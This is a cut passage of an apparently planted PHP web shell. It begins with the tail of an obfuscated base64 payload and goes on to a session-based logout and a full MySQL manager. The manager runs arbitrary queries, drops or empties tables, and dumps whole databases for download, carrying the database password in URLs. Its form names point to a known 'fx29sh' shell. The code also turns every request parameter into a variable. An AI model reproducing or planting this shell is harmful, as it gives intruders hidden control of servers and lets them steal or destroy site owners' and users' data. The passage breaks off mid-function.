N56+/qm9OpMGzw9o09LDyIMydh1CsuTqb6lvxOKR6yiefbiK97cQF4lre4/idARGdaujmDr5XvpxPQXP/guZC3mu3GcxgGvFiMWRjD2jvXBa3biz+dp/gU="))))));}	
elseif($_GET['do'] == 'metu') {
	

echo '<form action="?dir=$dir&do=metu" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Byee !';
	
}
elseif($_GET['do'] == 'sql') {
	echo "
<table style=width:100%; border=0 class=tabnet cellpadding=3 cellspacing=1 align=center>

	<tr>
	<td valign=top bgcolor=#151515 class=style2 style=width: 139px>
	<center><b><font size=5 style=italic color=#00ff00>MySQL Manager</font></b></center></td></tr></table>
";
function view_size($size) {
  if (!is_numeric($size)) { return FALSE; }
  else {
if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
else {$size = $size . " B";}
return $size;
  }
}
function mysql_dump($set) {
  $sock = $set["sock"];
  $db = $set["db"];
  $print = $set["print"];
  $nl2br = $set["nl2br"];
  $file = $set["file"];
  $add_drop = $set["add_drop"];
  $tabs = $set["tabs"];
  $onlytabs = $set["onlytabs"];
  $ret = array();
  $ret["err"] = array();
  if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
  if (empty($db)) {$db = "db";}
  if (empty($print)) {$print = 0;}
  if (empty($nl2br)) {$nl2br = 0;}
  if (empty($add_drop)) {$add_drop = TRUE;}
  if (empty($file)) {
$file = $tmp_dir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
  }
  if (!is_array($tabs)) {$tabs = array();}
  if (empty($add_drop)) {$add_drop = TRUE;}
  if (sizeof($tabs) == 0) {
$res = mysql_query("SHOW TABLES FROM ".$db, $sock);
if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
  }
  $out = "
  # Dumped By ".$xName."
  # MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
  # Date: ".date("d.m.Y H:i:s")."
  # DB: \"".$db."\"
  #---------------------------------------------------------";
  $c = count($onlytabs);
  foreach($tabs as $tab) {
if ((in_array($tab,$onlytabs)) or (!$c)) {
  if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
  $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
  if (!$res) {$ret["err"][] = mysql_smarterror();}
  else {
$row = mysql_fetch_row($res);
$out .= $row["1"].";\n\n";
$res = mysql_query("SELECT * FROM `$tab`", $sock);
if (mysql_num_rows($res) > 0) {
  while ($row = mysql_fetch_assoc($res)) {
$keys = implode("`, `", array_keys($row));
$values = array_values($row);
foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
$values = implode("', '", $values);
$sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
$out .= $sql;
  }
}
  }
}
  }
  $out .= "#---------------------------------------------------------------------------------\n\n";
  if ($file) {
$fp = fopen($file, "w");
if (!$fp) {$ret["err"][] = 2;}
else {
  fwrite ($fp, $out);
  fclose ($fp);
}
  }
  if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
  return $out;
}
function mysql_buildwhere($array,$sep=" and",$functs=array()) {
  if (!is_array($array)) {$array = array();}
  $result = "";
  foreach($array as $k=>$v) {
$value = "";
if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
$value .= "'".addslashes($v)."'";
if (!empty($functs[$k])) {$value .= ")";}
$result .= "`".$k."` = ".$value.$sep;
  }
  $result = substr($result,0,strlen($result)-strlen($sep));
  return $result;
}
function mysql_fetch_all($query,$sock) {
  if ($sock) {$result = mysql_query($query,$sock);}
  else {$result = mysql_query($query);}
  $array = array();
  while ($row = mysql_fetch_array($result)) {$array[] = $row;}
  mysql_free_result($result);
  return $array;
}
function mysql_smarterror($sock) {
  if ($sock) { $error = mysql_error($sock); }
  else { $error = mysql_error(); }
  $error = htmlspecialchars($error);
  return $error;
}
function mysql_query_form() {
  global $submit,$sql_x,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
  if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
  if ($sql_query_result or (!$sql_confirm)) {$sql_x = $sql_goto;}
  if ((!$submit) or ($sql_x)) {
echo "<table><tr><td><form name=\"fx29sh_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=x value=sql><input type=hidden name=sql_x value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\"> <input type=submit value=\"No\"></form></td>";
if ($tbl_struct) {
  echo "<td valign=\"top\"><b>Fields:</b><br>";
  foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "+ <a href=\"#\" onclick=\"document.fx29sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
  echo "</td></tr></table>";
}
  }
  if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
}
function mysql_create_db($db,$sock="") {
  $sql = "CREATE DATABASE `".addslashes($db)."`;";
  if ($sock) {return mysql_query($sql,$sock);}
  else {return mysql_query($sql);}
}
function mysql_query_parse($query) {
  $query = trim($query);
  $arr = explode (" ",$query);
  $types = array(
"SELECT"=>array(3,1),
"SHOW"=>array(2,1),
"DELETE"=>array(1),
"DROP"=>array(1)
  );
  $result = array();
  $op = strtoupper($arr[0]);
  if (is_array($types[$op])) {
$result["propertions"] = $types[$op];
$result["query"]  = $query;
if ($types[$op] == 2) {
  foreach($arr as $k=>$v) {
if (strtoupper($v) == "LIMIT") {
  $result["limit"] = $arr[$k+1];
  $result["limit"] = explode(",",$result["limit"]);
  if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
  unset($arr[$k],$arr[$k+1]);
}
  }
}
  }
  else { return FALSE; }
}
function disp_error($msg) { echo "<div class=errmsg>$msg</div>\n"; }
function html_style() {
$style = ' <style type="text/css"> a { text-decoration:none; } a:hover { color: #00ff00; border-bottom:1px solid #00ff00; } input[type="text"], input[type="password"], select{ background:#111111; border:0; padding:2px; border:1px solid #444444; } input[type="submit"]{ background:#111111; color:#ffffff; margin:0 4px; border:1px solid #444444;} input[type="text"]:hover, input[type="submit"]:hover, input[type="password"]:hover, select:hover{ border-bottom:1px solid #00ff00;border-top:1px solid #00ff00;} .tab { width:100%; } th{ background:#191919; border-bottom:1px solid #333333; font-weight:normal; } .tub { width:100%; }  .tub th{ border-bottom:1px solid #00ff00; padding:3px;} .tub tr:hover{ background:#006400; } .tub td{ border-bottom:1px solid #333333; padding-left:3px; } #maininfo { padding:5px; margin-top:10px; margin-left:2px; margin-right:2px; background:#191919; } #maininfo a{ color:#00ff00; } textarea { background:#000000; border:1px solid #444444;} textarea:hover { border:1px solid #00ff00;} </style><center>';
return $style;
}
$auto_surl = TRUE;
foreach ($_REQUEST as $k => $v) {
  if (!isset($$k)) { $$k = $v; }
}
if ($auto_surl) {
  $include = "&";
  foreach (explode("&",getenv("QUERY_STRING")) as $v) {
$v= explode("=",$v);
$name= urldecode($v[0]);
$value= @urldecode($v[1]);
$needles = array("http://","https://","ssl://","ftp://","\\\\");
foreach ($needles as $needle) {
  if (strpos($value,$needle) === 0) {
$includestr .= urlencode($name)."=".urlencode($value)."&";
  } } } }
if (empty($surl)) { $surl = htmlspecialchars("?".@$includestr); }
if (!isset($x)) { $x = "sql"; }
  if ($x == "sql") {
  foreach (array("sort","sql_sort") as $v) {
if (!empty($_GET[$v])) { $$v = $_GET[$v]; }
if (!empty($_POST[$v])) { $$v = $_POST[$v]; }
  }
  if ($sort_save) {
if (!empty($sort)) { setcookie("sort",$sort); }
if (!empty($sql_sort)) { setcookie("sql_sort",$sql_sort); }
  }
  if (!isset($sort)) { $sort = $sort_default; }
  $sort = htmlspecialchars($sort);
  $sort[1] = strtolower($sort[1]);
  echo html_style();
echo "<div id='maininfo'>";
  if ($x == "sql") {
  $sql_surl = $surl."x=sql";
  if (!isset($sql_login)) { $sql_login = ""; }
  if (!isset($sql_passwd)) { $sql_passwd = ""; }
  if (!isset($sql_server)) { $sql_server = ""; }
  if (!isset($sql_port)) { $sql_port = ""; }
  if (!isset($sql_tbl)) { $sql_tbl = ""; }
  if (!isset($sql_x)) { $sql_x = ""; }
  if (!isset($sql_tbl_x)) { $sql_tbl_x = ""; }
  if (!isset($sql_order)) { $sql_order = ""; }
  if (!isset($sql_x)) { $sql_x = ""; }
  if (!isset($sql_getfile)) { $sql_getfile = ""; }
  if (@$sql_login)  { $sql_surl .= "&sql_login=".htmlspecialchars($sql_login); }
  if (@$sql_passwd) { $sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd); }
  if (@$sql_server) { $sql_surl .= "&sql_server=".htmlspecialchars($sql_server); }
  if (@$sql_port){ $sql_surl .= "&sql_port=".htmlspecialchars($sql_port); }
  if (@$sql_db) { $sql_surl .= "&sql_db=".htmlspecialchars($sql_db); }
  $sql_surl .= "&";
  echo "";
  if (@$sql_server) {
$sql_sock = @mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
$err = mysql_smarterror($sql_sock);
@mysql_select_db($sql_db,$sql_sock);
if (@$sql_query and $submit) {
  $sql_query_result = mysql_query($sql_query,$sql_sock);
  $sql_query_error = mysql_smarterror($sql_sock);
}
  }
  else { $sql_sock = FALSE; }
  if (!$sql_sock) {
if (!@$sql_server) { echo "<blink><b><font style= color:#ff0000>No Connection ! ! !</font></b></blink>"; }
else { disp_error("ERROR: ".$err); }
  }
  else {
#SQL Quicklaunch
$sqlquicklaunch= array();
$sqlquicklaunch[] = array("Index",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
$sqlquicklaunch[] = array("Query",$sql_surl."sql_x=query&sql_tbl=".urlencode($sql_tbl));
$sqlquicklaunch[] = array("Server status",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=serverstatus");
$sqlquicklaunch[] = array("Server variables",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=servervars");
$sqlquicklaunch[] = array("Processes",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=processes");
$sqlquicklaunch[] = array("Logout",$surl."x=sql");
echo "MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") Server: ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")<br>";
if (count($sqlquicklaunch) > 0) {
  foreach($sqlquicklaunch as $item) {
echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";
  }
  }
  }
echo "</div>";
echo "<center><table class='tab'><tr>";
  if (!$sql_sock) {
  echo  '<td>
<form name="f_sql" action="'.$surl.'x=sql" method="POST">
<input type="hidden" name="x" value="sql">
<table class="tabnet" style="padding:1px;">
<tr><th colspan="2"><b>MySQL Manager</b></th></tr>
<tr><td>Host</td><td><input type="text" name="sql_server" class="inputz" style="width:249px;background:black" value="localhost"></td></tr>
<tr><td>Username</td><td><input type="text" name="sql_login" class="inputz" value="" style="width:249px;background:black"></td></tr>
<tr><td>Password</td><td><input type="password" name="sql_passwd" class="inputz" value="" style="width:249px;background:black;"></td></tr>
<tr><td>Database</td><td><input type="text" name="sql_db" value="" class="inputz" style="width:249px;background:black"></td></tr>
<tr><td>Port</td><td><input type="text" name="sql_port"  class="inputz" value="3306" style="background:black;" size="6"> <input type="submit" class="inputzbut" style=color:$color value="Connect"></td></tr>
</table>
</form>';
  }
  else {
  echo  '<td valign="top" style="border:1px solid #333333;">
<center>
<a href="'.$sql_surl.'"><b style="color:#00ff00;">HOME</b></a>
<hr size="1" noshade>';
  $result = mysql_list_dbs($sql_sock);
  if (!$result) { echo mysql_smarterror(); }
  else {
  echo  '<form action="'.$surl.'x=sql">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<select name="sql_db" onchange="this.form.submit()" style="width:100%;">';
$c = 0;
$dbs = "";
while ($row = mysql_fetch_row($result)) {
  $dbs .= "\t\t<option value=\"".$row[0]."\"";
  if (@$sql_db == $row[0]) { $dbs .= " selected"; }
  $dbs .= ">".$row[0]."</option>\n";
  $c++;
}
echo "\t\t<option value=\"\">Databases (".$c.")</option>\n";
echo $dbs;
  }
echo '</select>
<hr size="1" noshade>
</form>
</center>';
if (isset($sql_db)) {
  $result = mysql_list_tables($sql_db);
  if (!$result) { 
$result = mysql_list_dbs($sql_sock);
$num = mysql_num_rows($result);
for( $i = 0; $i < $num; $i++ ) {
$dbname = mysql_dbname( $result, $i );
echo "<table class='tab'><td style='background:#3F3F3F;border:1px solid #202020;border-top: 1px solid #505050;border-left: 1px solid #505050;'><b>+ <a href=\"".$sql_surl."sql_db=".$dbname."\">$dbname</a></b></td></table>"; } }
  else {
echo "\t<table class='tub'><th><a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a></th></table><br>\n";
$c = 0;
while ($row = mysql_fetch_array($result)) {
  $count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]);
  $count_row = mysql_fetch_array($count);
  echo "\t<b>+ <a style='color:#00ff00;' href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\">".htmlspecialchars($row[0])."</a></b> (".$count_row[0].")</br></b>\n";
  mysql_free_result($count);
  $c++;
}
if (!$c) { echo "No tables found in database"; }
  }
}
echo '</td>';
echo '<td style="border:1px solid #333333;">';
$diplay = TRUE;
if (@$sql_db) {
  if (!is_numeric($c)) { $c = 0; }
  if ($c == 0) { $c = "no"; }
  echo "\t<center><b>There are ".$c." table(s) in database: ".htmlspecialchars($sql_db)."";
  if (count(@$dbquicklaunch) > 0) {
foreach($dbsqlquicklaunch as $item) {
  echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";
}
  }
  echo "</b></center>\n";
  $xs = array("","dump");
  if ($sql_x == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_x = "query";}
  elseif ($sql_x == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_x = "dump";}
  elseif ($sql_x == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_x = "query";}
  elseif ($sql_tbl_x == "insert") {
if ($sql_tbl_insert_radio == 1) {
  $keys = "";
  $akeys = array_keys($sql_tbl_insert);
  foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
  if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
  $values = "";
  $i = 0;
  foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
  if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
  $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
  $sql_x = "query";
  $sql_tbl_x = "browse";
}
elseif ($sql_tbl_insert_radio == 2) {
  $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
  $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
  $result = mysql_query($sql_query) or print(mysql_smarterror());
  $result = mysql_fetch_array($result, MYSQL_ASSOC);
  $sql_x = "query";
  $sql_tbl_x = "browse";
}
  }
  if ($sql_x == "query") {
echo "<hr size=\"1\" noshade>";
if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
if ($sql_query_result or (!$sql_confirm)) {$sql_x = $sql_goto;}
if ((!$submit) or ($sql_x)) { echo "<table class='tab'><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_x\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"> <input type=\"submit\" value=\"No\"></form></td></tr></table>"; }
  }
  if (in_array($sql_x,$xs)) {
echo '<table class="tab">
<tr>
<td style="border:1px solid #333333;padding:3px;">
<b>Create new table:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="newtbl">
<input type="hidden" name="sql_db" value="'.htmlspecialchars($sql_db).'">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input type="text" name="sql_newtbl" size="20">
Fields: <input type="text" name="sql_field" size="3">
<input class="inputzbut" type="submit" value="Create">
</form>
</td>
<td style="border:1px solid #333333;padding:3px;"><b>Dump DB:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="dump">
<input type="hidden" name="sql_db" value="'.htmlspecialchars($sql_db).'">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input type="text" name="dump_file" size="30" value="dump_'.getenv("SERVER_NAME").'_'.$sql_db.'_'.date("d-m-Y-H-i-s").'.sql">
<input type="submit" class="inputzbut" name="submit" value="Dump">
</form>
</td>
</tr>
</table>';
if (!empty($sql_x)) { echo "<hr size=\"1\" noshade>"; }
if ($sql_x == "newtbl") {
  echo "<b>";
  if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {
echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
  }
  else { echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror(); }
}
elseif ($sql_x == "dump") {
  if (empty($submit)) {
$diplay = FALSE;
echo "<form method=\"GET\"><input type=\"hidden\" name=\"x\" value=\"sql\"><input type=\"hidden\" name=\"sql_x\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br><br>";
echo "<b>DB:</b> <input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>";
$v = join (";",$dmptbls);
echo "<b>Only tables (explode \";\") :</b> <input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>";
if ($dump_file) {$tmp = $dump_file;}
else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
echo "<b>File:</b> <input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>";
echo "<b>Download: </b> <input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>";
echo "<b>Save to file: </b> <input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";
echo "<br><br><input class=\"inputzbut\" type=\"submit\" name=\"submit\" value=\"Dump\">";
echo "</form>";
  }
  else {
$diplay = TRUE; $set = array(); $set["sock"] = $sql_sock; $set["db"] = $sql_db; $dump_out = "download"; $set["print"] = 0;
$set["nl2br"] = 0; $set[""] = 0; $set["file"] = $dump_file; $set["add_drop"] = TRUE; $set["onlytabs"] = array();
if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}
$ret = mysql_dump($set);
if ($sql_dump_download) {
  @ob_clean();
  header("Content-type: application/octet-stream");
  header("Content-length: ".strlen($ret));
  header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");
  echo $ret;
  exit;
}
elseif ($sql_dump_savetofile) {
  $fp = fopen($sql_dump_file,"w");
  if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
  else {
fwrite($fp,$ret);
fclose($fp);
echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
  }
}
else {echo "<b>Dump: nothing to do!</b>";}
  }
}
if ($diplay) {
  if (!empty($sql_tbl)) {
  if (empty($sql_tbl_x)) {$sql_tbl_x = "browse";}
  $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
  $count_row = mysql_fetch_array($count);
  mysql_free_result($count);
  $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
$tbl_struct_fields = array();
while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}
  if (@$sql_ls > @$sql_le) { $sql_le = $sql_ls + $perpage; }
  if (empty($sql_tbl_page)) { $sql_tbl_page = 0; }
  if (empty($sql_tbl_ls)) { $sql_tbl_ls = 0; }
  if (empty($sql_tbl_le)) { $sql_tbl_le = 30; }
  $perpage = $sql_tbl_le - $sql_tbl_ls;
  if (!is_numeric($perpage)) { $perpage = 10; }
  $numpages = $count_row[0]/$perpage;
  $e = explode(" ",$sql_order);
  if (count($e) == 2) {
if ($e[0] == "d") { $asc_desc = "DESC"; }
else { $asc_desc = "ASC"; }
$v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
  }
  else {$v = "";}
  $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
  $result = mysql_query($query) or print(mysql_smarterror());
  echo "<center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
  echo "<hr size=\"1\" noshade>";
  echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=structure\">[<b> Structure </b>]</a> &nbsp; ";
  echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=browse\">[<b> Browse </b>]</a> &nbsp; ";
  echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_x=tbldump&thistbl=1\">[<b> Dump </b>]</a> &nbsp; ";
  echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a> &nbsp; ";
  if ($sql_tbl_x == "structure") { echo "<b>Under construction!</b>"; }
  if ($sql_tbl_x == "insert") {
if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
if (!empty($sql_tbl_insert_radio)) { echo "<b>Under construction!</b>"; }
else {
  echo "<br><br><b>Inserting row into table:</b><br>";
  if (!empty($sql_tbl_insert_q)) {
$sql_query = "SELECT * FROM `".$sql_tbl."`";
$sql_query .= " WHERE".$sql_tbl_insert_q;
$sql_query .= " LIMIT 1;";
$result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());
$values = mysql_fetch_assoc($result);
mysql_free_result($result);
  }
  else {$values = array();}
  echo "<form method=\"POST\"><table width=\"1%\" class='tub'><tr><th><b>Field</b></th><th><b>Type</b></th><th><b>Function</b></th><th><b>Value</b></th></tr>";
  foreach ($tbl_struct_fields as $field) {
$name = $field["Field"];
if (empty($sql_tbl_insert_q)) {$v = "";}
echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";
$i++;
  }
  echo "</table><br>";
  echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";
  if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}
  echo "<br><br><input class=\"inputzbut\" type=\"submit\" value=\"Confirm\"></form>";
}
  }
  if ($sql_tbl_x == "browse") {
$sql_tbl_ls = abs($sql_tbl_ls);
$sql_tbl_le = abs($sql_tbl_le);
echo "<hr size=\"1\" noshade>";
echo "<b>Page: </b>";
$b = 0;
for($i=0;$i<$numpages;$i++) {
  if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";}
  echo $i;
  if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}
  if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}
  else { echo " "; }
}
if ($i == 0) {echo "empty";}
